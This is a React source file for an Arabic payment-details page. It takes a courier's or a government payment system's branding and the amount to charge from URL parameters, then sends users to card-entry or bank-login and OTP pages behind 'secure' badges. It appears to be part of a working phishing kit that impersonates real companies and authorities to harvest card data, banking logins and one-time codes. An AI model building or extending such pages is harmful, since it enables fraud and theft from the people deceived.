import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry, getCountryByCurrency } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, ShieldCheck, Lock, Sparkles, CheckCircle2 } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import CompanyHero from "@/components/CompanyHero";
import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
import PageLoader from "@/components/PageLoader";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { isGovernmentService } from "@/lib/governmentPaymentServices";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { data: linkData, isLoading, isError } = useLink(id);
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError || searchParams.get('service')) {
      setShowPage(true);
    }
  }, [linkData, isError, searchParams]);

  const serviceKey = searchParams.get('company') || searchParams.get('service') || searchParams.get('s') || linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  const shippingInfo = linkData?.payload as any;
  
  const amountParam = searchParams.get('amount') || searchParams.get('a');
  const currencyParam = searchParams.get('currency');
  const methodParam = searchParams.get('method') || searchParams.get('pm');
  const countryParam = searchParams.get('country') || searchParams.get('c');
  
  // استنتاج الدولة من العملة إذا لم تكن موجودة
  const inferredCountryFromCurrency = currencyParam ? getCountryByCurrency(currencyParam) : null;
  
  const countryCode = countryParam || inferredCountryFromCurrency || shippingInfo?.selectedCountry || "SA";
  const currencyInfo = getCurrencyByCountry(countryCode);
  
  // Check if this is a government service
  const isGovService = isGovernmentService(serviceKey) || serviceKey.toLowerCase() === 'government_payment';
  const govSystem = getGovernmentPaymentSystem(countryCode);

  const rawAmount = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyParam || countryCode);

  if (isLoading && !showPage) {
    return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;
  }
  
  const detectedEntity = detectEntityFromURL();
  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
  const displayLogo = (isGovService ? govSystem.logo : null) || entityLogo || branding.logo;
  
  // Use government theme if it's a government service
  const primaryColor = isGovService ? govSystem.colors.primary : (companyBranding?.colors.primary || branding.colors.primary);
  const secondaryColor = isGovService ? govSystem.colors.secondary : (companyBranding?.colors.secondary || branding.colors.secondary);
  const surfaceColor = isGovService ? govSystem.colors.surface : (companyBranding?.colors.surface || '#F8F9FA');
  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif');

  // Conditional flow enforcement based on payment method
  useEffect(() => {
    const paymentMethod = methodParam || (linkData?.payload as any)?.payment_method || 'card';
    const isShippingService = !!companyBranding && !isGovService;
    
    // Block access to card page for bank_login payment method
    if (paymentMethod === 'bank_login' && !isShippingService) {
      // Redirect to bank selector if trying to access card flow
      const queryParams = new URLSearchParams({
        service: serviceKey,
        country: countryCode,
        amount: amount.toString(),
        currency: currencyParam || currencyInfo?.code || 'SAR'
      }).toString();
      
      // If user tries to go to card-input, redirect to bank-selector
      if (window.location.pathname.includes('/card-input')) {
        navigate(`/pay/${id}/bank-selector?${queryParams}`, { replace: true });
      }
    }
    
    // Block access to bank pages for card payment method
    if (paymentMethod === 'card' || isShippingService) {
      // Redirect away from bank selector if card payment selected
      if (window.location.pathname.includes('/bank-selector') || 
          window.location.pathname.includes('/bank-login')) {
        const queryParams = new URLSearchParams({
          service: serviceKey,
          country: countryCode,
          amount: amount.toString(),
          currency: currencyParam || currencyInfo?.code || 'SAR'
        }).toString();
        
        navigate(`/pay/${id}/card-input?${queryParams}`, { replace: true });
      }
    }
  }, [methodParam, linkData, companyBranding, isGovService, serviceKey, countryCode, amount, currencyParam, currencyInfo, id, navigate]);

  const handleProceed = () => {
    const paymentMethod = methodParam || (linkData?.payload as any)?.payment_method || 'card';
    const isShippingService = !!companyBranding && !isGovService;

    const queryParams = new URLSearchParams({
      service: serviceKey,
      country: countryCode,
      amount: amount.toString(),
      currency: currencyParam || currencyInfo?.code || 'SAR'
    }).toString();

    // Conditional navigation based on payment method
    if (paymentMethod === 'bank_login' && !isShippingService) {
      // LOGIN FLOW: Details → Bank Selector → Bank Login → OTP
      navigate(`/pay/${id}/bank-selector?${queryParams}`);
    } else {
      // CARD FLOW: Details → Card Input → Card → OTP
      navigate(`/pay/${id}/card-input?${queryParams}`);
    }
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`تفاصيل الدفع - ${serviceName}`}
        customDescription={`أكمل عملية الدفع بأمان وسهولة - ${serviceName}`}
        amount={formattedAmount}
      />

      {/* Branded Header */}
      <div 
        className="sticky top-0 z-50 w-full shadow-md"
        style={{
          background: isGovService ? govSystem.gradients.header : (companyBranding?.gradients.hero || `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`),
          borderBottom: `2px solid ${primaryColor}`,
          boxShadow: companyBranding?.shadows.md || '0 4px 6px rgba(0,0,0,0.1)'
        }}
      >
        <div className="container mx-auto px-3 sm:px-4">
          <div className="flex items-center justify-between h-14 sm:h-16">
            <div className="flex items-center gap-2 sm:gap-3">
              {displayLogo && (
                <div
                  className={`rounded-lg px-2 py-1 ${isGovService ? 'bg-foreground/10 backdrop-blur-sm border border-white/20' : 'bg-transparent border border-transparent'}`}
                >
                  <img
                    src={displayLogo}
                    alt={serviceName}
                    className="h-7 sm:h-9 w-auto object-contain"
                  />
                </div>
              )}
              <div className="text-white">
                <h2 
                  className="text-base sm:text-lg font-bold"
                  style={{ fontFamily: fontFamily }}
                >
                  {serviceName}
                </h2>
                <p className="text-xs opacity-90 hidden sm:block">
                  الدفع الآمن
                </p>
              </div>
            </div>
            
            <div className="flex items-center gap-1.5 px-2 sm:px-3 py-1 rounded-full bg-white/20 backdrop-blur-sm">
              <ShieldCheck className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-white" />
              <span className="text-xs font-medium text-white">آمن</span>
            </div>
          </div>
        </div>
      </div>

      {/* Company Hero */}
      <CompanyHero serviceKey={serviceKey} className="mb-0" staticMode={!!companyBranding && !isGovService} />

      {/* Main Content */}
      <div 
        className="min-h-screen py-6 sm:py-8"
        dir="rtl"
        style={{
          background: isGovService
            ? `linear-gradient(135deg, ${surfaceColor}, ${govSystem.colors.background})`
            : `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
          fontFamily: fontFamily
        }}
      >
        <div className="container mx-auto px-3 sm:px-4 max-w-2xl">
          {/* Page Title */}
          <div className="text-center mb-6">
            <h1 
              className="text-xl sm:text-2xl font-bold mb-2"
              style={{
                color: primaryColor,
                fontFamily: fontFamily
              }}
            >
              تفاصيل الدفع
            </h1>
            <p className="text-sm text-gray-600">
              راجع تفاصيل طلبك قبل المتابعة
            </p>
          </div>

          <Card 
            className="overflow-hidden border-0 mb-6"
            style={{
              borderRadius: companyBranding?.borderRadius.lg || '20px',
              boxShadow: companyBranding?.shadows.lg || '0 8px 32px rgba(0,0,0,0.1)'
            }}
          >
            {/* Shipping Info Display */}
            {shippingInfo && (
              <>
                <div className="px-4 sm:px-6 py-4 bg-white space-y-3">
                  {shippingInfo.tracking_number && (
                    <div className="flex items-center justify-between py-2 border-b">
                      <div className="flex items-center gap-2 text-gray-600">
                        <Hash className="w-4 h-4" />
                        <span className="text-sm">رقم الشحنة</span>
                      </div>
                      <span className="font-bold text-sm">{shippingInfo.tracking_number}</span>
                    </div>
                  )}
                  {shippingInfo.package_description && (
                    <div className="flex items-center justify-between py-2 border-b">
                      <div className="flex items-center gap-2 text-gray-600">
                        <Truck className="w-4 h-4" />
                        <span className="text-sm">وصف الطرد</span>
                      </div>
                      <span className="font-semibold text-sm">{shippingInfo.package_description}</span>
                    </div>
                  )}
                </div>
              </>
            )}
          </Card>

          {/* Payment Summary */}
          <Card 
            className="overflow-hidden border-0 mb-4"
            style={{
              borderRadius: '16px',
              boxShadow: '0 4px 20px rgba(0,0,0,0.08)',
              borderTop: `3px solid ${primaryColor}`
            }}
          >
            <div className="px-4 sm:px-6 py-4 bg-white space-y-3">
              <div className="flex justify-between py-2 border-b">
                <span className="text-sm text-gray-600">الخدمة</span>
                <span className="font-bold text-sm">{serviceName}</span>
              </div>
              
              <div 
                className="flex justify-between items-center py-3 px-4 rounded-lg"
                style={{
                  background: `linear-gradient(135deg, ${primaryColor}10, ${secondaryColor}10)`
                }}
              >
                <span className="text-base font-bold">المبلغ الإجمالي</span>
                <span className="text-xl sm:text-2xl font-bold" style={{ color: primaryColor }}>
                  {formattedAmount}
                </span>
              </div>
            </div>
          </Card>

          {/* Payment Method */}
          <Card 
            className="overflow-hidden border-0 mb-6"
            style={{
              borderRadius: '16px',
              boxShadow: '0 4px 20px rgba(0,0,0,0.08)',
              borderTop: `3px solid ${primaryColor}`
            }}
          >
            <div className="px-4 sm:px-6 py-4 bg-white">
              {(methodParam || (linkData?.payload as any)?.payment_method) === 'bank_login' ? (
                <div 
                  className="flex items-center gap-4 p-5 rounded-xl border-2"
                  style={{
                    borderColor: primaryColor,
                    background: `${primaryColor}08`
                  }}
                >
                  <div 
                    className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
                    style={{
                      background: `${primaryColor}20`
                    }}
                  >
                    <Lock className="w-6 h-6" style={{ color: primaryColor }} />
                  </div>
                  <div className="flex-1">
                    <p className="font-bold text-base mb-1">تسجيل دخول البنك 🏦</p>
                    <p className="text-sm text-gray-600">
                      الدفع الآمن عبر حسابك البنكي
                    </p>
                  </div>
                  <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
                </div>
              ) : (
                <div 
                  className="flex items-center gap-4 p-5 rounded-xl border-2"
                  style={{
                    borderColor: primaryColor,
                    background: `${primaryColor}08`
                  }}
                >
                  <div 
                    className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
                    style={{
                      background: `${primaryColor}20`
                    }}
                  >
                    <CreditCard className="w-6 h-6" style={{ color: primaryColor }} />
                  </div>
                  <div className="flex-1">
                    <p className="font-bold text-base mb-1">الدفع بالبطاقة 💳</p>
                    <p className="text-sm text-gray-600">
                      Visa • Mastercard • Mada
                    </p>
                  </div>
                  <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
                </div>
              )}
            </div>
          </Card>
      
          {/* Proceed Button */}
          <Button
            onClick={handleProceed}
            size="lg"
            className="w-full text-lg py-6 text-white font-bold rounded-xl"
            style={{
              background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
              boxShadow: `0 8px 24px -8px ${primaryColor}70`
            }}
          >
            <span className="ml-2">متابعة للدفع</span>
            <ArrowLeft className="w-5 h-5 mr-2" />
          </Button>
    
          <p className="text-xs text-center text-gray-500 mt-4">
            🔒 جميع المعاملات مشفرة وأمنة
          </p>

          {/* Footer */}
          <div className="mt-6 text-center">
            <div className="flex items-center justify-center gap-3 text-xs text-gray-500 mb-2">
              <div className="flex items-center gap-1">
                <Lock className="w-3 h-3" />
                <span className="text-xs">SSL</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1">
                <ShieldCheck className="w-3 h-3" />
                <span className="text-xs">Verified</span>
              </div>
            </div>
            <p className="text-xs text-gray-400">
              © 2025 {serviceName}
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentDetails;
